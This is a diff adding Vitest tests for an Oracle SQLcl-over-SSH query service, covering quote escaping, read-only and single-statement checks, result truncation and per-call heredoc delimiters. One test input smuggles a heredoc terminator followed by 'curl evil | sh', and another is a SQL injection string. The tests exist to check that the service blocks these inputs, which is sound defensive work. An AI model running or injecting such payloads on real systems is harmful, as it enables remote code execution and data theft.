@@ -142,6 +142,7 @@ Disconnected from Oracle Database.
   it('escapeOracleLikeFilter doubles single quotes so a filter cannot break the literal', () => {
     expect(escapeOracleLikeFilter("O'REILLY")).toBe("O''REILLY");
     expect(escapeOracleLikeFilter("' UNION SELECT 1 --")).toBe("'' UNION SELECT 1 --");
+    expect(() => escapeOracleLikeFilter("x\nEOF_ORACLE_SQLCL\ncurl evil | sh")).toThrow(/xuống dòng/);
   });
 
   it('assertSqlclSingleStatement blocks multi-statements and directives', () => {
@@ -153,6 +154,15 @@ Disconnected from Oracle Database.
     }
     expect(() => assertSqlclSingleStatement("SELECT 'SET HOST' FROM DUAL")).not.toThrow();
     expect(() => assertSqlclSingleStatement('SELECT 1 /* SET HOST */ FROM DUAL')).not.toThrow();
+    // Return the ORIGINAL SQL: stripping literals for inspection must never rewrite the query.
+    expect(assertSqlclSingleStatement("SELECT name FROM emp WHERE name = 'Alice'")).toBe(
+      "SELECT name FROM emp WHERE name = 'Alice'"
+    );
+  });
+
+  it('allows SELECTs whose column names look like DDL keywords', () => {
+    expect(() => assertReadOnlyQuery('SELECT comment, lock_version, flashback_date FROM posts')).not.toThrow();
+    expect(() => assertReadOnlyQuery('SELECT * FROM posts FOR UPDATE')).toThrow(/Bị từ chối/);
   });
 
   it('safeOracleObjectIdentifier accepts quoted mixed case and rejects injection', () => {
@@ -185,6 +195,13 @@ Disconnected from Oracle Database.
     expect(grid.rowCount).toBe(1200);
     expect(grid.truncated).toBe(true);
     expect((grid.rows[0]![1] as string).length).toBeLessThanOrEqual(2001);
+    // A payload that exceeds the cap on its very first row must still show one (capped) row,
+    // not an empty grid with rowCount > 0.
+    const single = buildOracleGrid(
+      Array.from({ length: 400 }, (_, i) => ({ ID: i, TEXT: 'x'.repeat(2100) }))
+    );
+    expect(single.rows.length).toBeGreaterThanOrEqual(1);
+    expect(single.truncated).toBe(true);
   });
 });
 
@@ -267,6 +284,26 @@ describe('oracleSqlclService - Execution & SSH mocking', () => {
     expect(res.action).toBe('query');
     expect(res.data).toEqual([{ COL1: 'val1' }]);
     expect(sshService.execRemoteCommand).toHaveBeenCalled();
+  });
+
+  it('keeps SQL literals intact and uses a per-call heredoc delimiter', async () => {
+    seedActiveProfile({ maxRows: 100 });
+    vi.spyOn(sshService, 'getSshConfigs').mockResolvedValueOnce([
+      { id: 'ssh-1', name: 'Bastion' } as any,
+    ]);
+    vi.spyOn(sshService, 'getSshSecret').mockResolvedValueOnce('secret-pass');
+    vi.spyOn(sshService, 'execRemoteCommand').mockResolvedValueOnce({
+      stdout: '[]', stderr: '', exitStatus: 0,
+    });
+    const sql = "SELECT name FROM emp WHERE name = 'Alice' AND dept = 'SALES'";
+    const resStr = await executeOracleQuery({ query: sql }, fakeDb);
+    const res = JSON.parse(resStr);
+    expect(res.success).toBe(true);
+    expect(res.executedSql).toContain("'Alice'");
+    expect(res.executedSql).toContain("'SALES'");
+    const command = (sshService.execRemoteCommand as any).mock.calls[0][1] as string;
+    expect(command).toMatch(/<< 'EOF_ORACLE_SQLCL_[0-9A-F]{32}'/);
+    expect(command.split(/\r?\n/).filter((line) => line.startsWith('EOF_ORACLE_SQLCL'))).toHaveLength(1);
   });
 
   it('executes describe_table over mocked SSH', async () => {
